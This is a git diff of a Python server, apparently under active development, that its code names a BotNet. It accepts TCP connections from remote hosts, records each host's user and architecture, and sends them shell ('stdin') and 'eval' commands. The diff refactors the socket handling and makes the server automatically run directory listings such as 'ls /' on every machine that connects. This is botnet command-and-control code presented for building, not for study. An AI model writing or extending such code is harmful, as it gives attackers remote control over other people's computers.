@@ -7,8 +7,8 @@ from flask_socketio import SocketIO, emit
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
-try: from server import byteutils
-except: import byteutils
+try: from server import formatsock
+except: import formatsock
 
 
 ''' Sumner: if you are reading this I have only just got the main concept working,
@@ -74,7 +74,9 @@ class BotNet(Thread):
         while True:
             self.tcpsock.listen(5)
             (clientsock, (ip, port)) = self.tcpsock.accept()
-            msgbytes = byteutils.recvFormatBytes(clientsock)
+            clientformatsock = formatsock.FormatSocket(clientsock)
+            msgbytes = clientformatsock.recv()
+            print(msgbytes)
             host_info = json.loads(msgbytes.decode('UTF-8'))
             print("[+] Recieved connection from {}".format(host_info['user']))
             allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)
@@ -84,20 +86,21 @@ class BotNet(Thread):
             allConnections[user] = Bot(clientsock, host_info)
 
             # Testing: automatically sends "say hi" command
-            allConnections[user].sendStdin('say hi\n')
+            allConnections[user].sendStdin('ls /\n')
+            allConnections[user].sendStdin('ls /Developer\n')
+            print(allConnections[user].recv())
 
 
 # TODO: can make this multi-threaded if want to send to multiple clients at once in the future
 class Bot:
     def __init__(self, sock, host_info):
-        self.sock = sock
+        self.sock = formatsock.FormatSocket(sock)
         self.arch = host_info['arch'][:-1]
         self.user = host_info['user'][:-1]
 
     def send(self, cmd, type="stdin"):
         json_str = json.dumps({type:cmd})
-        json_format = byteutils.formatBytes(json_str)
-        self.sock.sendall(json_format)
+        self.sock.send(json_str)
 
     def sendStdin(self, cmd):
         self.send(cmd,type="stdin")
@@ -107,6 +110,9 @@ class Bot:
 
     def sendEval(self, cmd):
         self.send(cmd, type="eval")
+
+    def recv(self):
+        return self.sock.recv()
 
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
